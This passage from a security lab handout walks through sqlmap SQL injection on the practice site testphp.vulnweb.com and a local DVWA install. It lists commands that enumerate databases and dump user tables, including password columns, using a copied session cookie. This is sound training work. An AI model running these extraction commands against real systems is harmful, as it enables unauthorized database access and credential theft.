---------------------------------------------------------------------
 PART C : SQL INJECTION - SQLMAP on testphp.vulnweb.com
---------------------------------------------------------------------

Step 1 : list databases

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs

  Answer the prompts:
    skip test payloads for other DBMSes ?        -> Y
    include all tests for MySQL ?                -> N
    keep testing other parameters ?              -> N

Step 2 : list tables of database acuart

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables

Step 3 : list columns of table users

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns

Step 4 : dump the table

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump

  Answer the prompts:
    store hashes to a temporary file ?           -> N
    crack them via dictionary attack ?           -> N

FAST MODE (no questions at all) - add  --batch  at the end :

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs --batch

Extra info commands :

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --current-db --current-user --banner --batch

sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C uname,pass --dump --batch


---------------------------------------------------------------------
 PART D : SQLMAP ON YOUR OWN DVWA  (works even with no internet)
---------------------------------------------------------------------

1) Open DVWA -> SQL Injection -> type 1 -> Submit
2) Press F12 -> Application / Storage -> Cookies -> copy PHPSESSID

3) Paste (replace PASTE_SESSION_ID_HERE) :

sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=PASTE_SESSION_ID_HERE; security=low" --dbs --batch

sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=PASTE_SESSION_ID_HERE; security=low" -D dvwa --tables --batch

sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=PASTE_SESSION_ID_HERE; security=low" -D dvwa -T users -C user,password --dump --batch

                                         check: ls /var/www/html
"Could not connect to the database"    -> sudo systemctl start mariadb
                                         then re-run PART "Create database" commands
"mysqli not installed"                 -> sudo apt install php-mysqli -y
                                         sudo systemctl restart apache2
Login fails                            -> run setup.php -> Create / Reset Database
Payloads shown as plain text           -> DVWA Security is not LOW
sqlmap: "parameter is not injectable"  -> for DVWA you forgot --cookie / session expired
git: command not found                 -> sudo apt install git -y
Page not updating                      -> Ctrl + Shift + R (hard refresh)
